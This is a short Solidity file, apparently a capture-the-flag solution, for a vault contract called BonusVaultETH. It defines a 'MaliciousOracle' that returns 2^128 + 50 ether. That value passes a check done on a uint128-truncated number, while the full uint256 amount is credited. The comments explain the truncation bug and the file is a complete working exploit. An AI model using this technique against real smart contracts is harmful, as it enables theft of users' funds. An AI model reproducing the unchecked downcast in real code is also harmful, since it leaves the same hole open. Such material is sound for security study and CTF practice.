// SPDX-License-Identifier: MIT
// Author: CTF Solver
// Purpose: Exploit type casting vulnerability in BonusVaultETH.claimBonus()
// Created: 2025-11-20
// Expected Result: Return a value that passes uint128 check but adds large amount to credits
//
// Vulnerability: The claimBonus function checks uint128(delta) <= MAX_BONUS,
// but then adds the full uint256 delta to credits. By returning a value where
// the lower 128 bits are <= MAX_BONUS, we can pass the check, but the full
// value will be added to credits.

pragma solidity ^0.8.24;

import {IOracleU} from "./IOracleU.sol";

contract MaliciousOracle is IOracleU {
    // Returns a value that when cast to uint128 is 50 ether (passes check)
    // but the full uint256 value is 2^128 + 50 ether (huge amount)
    function adjust(address user) external view returns (uint256) {
        // 2^128 + 50 ether
        // When cast to uint128: only keeps lower 128 bits = 50 ether (passes MAX_BONUS check)
        // When added to credits: uses full uint256 value = 2^128 + 50 ether
        return (uint256(1) << 128) + 50 ether;
    }
}
